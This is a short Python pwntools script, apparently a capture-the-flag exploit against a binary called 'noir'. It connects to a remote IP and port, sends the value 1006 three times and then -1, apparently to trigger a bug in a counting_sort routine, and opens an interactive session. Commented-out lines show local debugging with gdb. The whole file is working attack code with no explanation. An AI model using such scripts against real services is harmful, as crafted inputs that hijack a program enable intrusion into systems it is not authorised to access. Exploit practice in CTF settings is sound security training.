from pwn import *
#p = process("./noir")
p = remote('203.34.119.237', 11338)
#gdb.attach(p, """
#		r
#		b *counting_sort+292
#		c
#		""")
for i in range(3):	
	p.sendline("1006")
p.sendline('-1')
p.interactive()
